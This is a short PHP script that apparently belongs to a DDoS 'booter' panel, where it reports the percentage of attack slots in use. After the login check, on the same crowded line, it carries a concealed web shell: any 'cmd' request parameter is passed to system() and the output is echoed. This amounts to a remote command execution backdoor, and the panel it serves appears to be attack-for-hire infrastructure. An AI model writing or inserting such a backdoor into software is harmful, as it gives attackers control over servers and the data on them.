<?php
	ob_start();	
	require_once '../rip/configuration.php';
	require_once '../rip/init.php';

	if (!($user->LoggedIn()) || !($user->notBanned($odb))) {die();}$runningrip = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }$slotsx = $odb->query("SELECT COUNT(*) FROM `api` WHERE `slots`")->fetchColumn(0);$load    = round($runningrip / $slotsx * 100, 2);	echo $load;

?>